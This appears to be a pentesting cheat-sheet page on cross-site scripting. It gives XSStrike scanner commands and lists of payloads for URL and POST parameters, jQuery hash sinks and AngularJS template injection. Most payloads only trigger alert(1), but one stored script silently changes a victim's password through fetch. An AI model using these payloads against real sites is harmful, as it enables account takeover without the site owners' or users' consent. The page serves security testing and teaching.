---
title: Cross-Site Scripting (XSS)
desc: 
tags: [Burp, Cross, Site, Web, XSS]
alts: [Cookie-Hijacking]
render_with_liquid: true
---

{% raw %}

## Automation

- **[XSStrike](https://github.com/s0md3v/XSStrike){:target="_blank"}{:rel="noopener"}**

    XSS scanner.

    ```sh
    # GET request
    python xsstrike.py -u http://vulnerable.com/?param=test

    # POST reqeust
    python xsstrike.py -u http://vulnerable.com/post --data "username=test&email=test&comment=test"

    # data as JSON
    python xsstrike.py -u http://vulnerable.com/comment --data '{"comment": "test"}' --json
    ```

<br />


## Manual

1. **URL Parameters**

    1. **Common Payloads**

        ```
        /?q=<script>alert(1)</script>
        /?q="><script>alert(1)</script>
        /?q=<script>alert(1)</script>
        /?q="><script>alert(1)</script>
        /?q='></script><script>alert(1)</script>

        /?q=" src=1 onerror=alert(1)>
        /?q=<><img src=1 onerror=alert(1)>
        /?q="><img src=1 onerror=alert(1)>
        /?q="></span><img src=1 onerror=alert(1)>
        /?q="><svg onload=alert(1)>

        /?q=javascript:alert(1)
        /?q=\"-alert(1)//

        /?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E

        /?q=<a onmouseover=alert(1)>click</a>
        /?q=" onmouseleave='alert(1)'">

        /?q=<img src="jav ascript:alert(1)">
        /?q=<img src="jav&#x09;ascript:alert(1)">
        /?q=<img src="jav&#x0A;ascript:alert(1)">


        /?q=&subparam=--><script>alert(1)</script>
        /index.php#value='><script>alert(1)</script>
        ```

    2. **JQuery**

        ```
        https://vulnerable.com/#<img src=1 onerror=alert(1)>
        <iframe src="https://vulnerable.com/#" onload="this.src+='<img src=1 onerror=alert(1)>'">
        ```

    3. **AngularJS**

        If you find **"<html ng-app>"** or **"<div ng-app>"** in the HTML source code, you may be able to abuse it by XSS.

        ```
        https://vulnerable.com/?search={{$on.constructor('alert(1)')()}}
        ```

2. **POST Parameters**


    POST params are almost the same as URL params, so try the common payloads of section 1.  
    Ant the following ones.

    ```
    title=<a href="http://localhost/newUser?username=test&password=test">test</a>&comment=hello
    ```

    1. **Change User Profiles**

        If the website allows users to change passwords from the URL params...

        ```
        /profile?new_password=password
        ```

        Submit the payload to user input forms such as messages, comments, forums...

        ```
        <script>fetch('/profile?new_password=password');</script>
        ```

{% endraw %}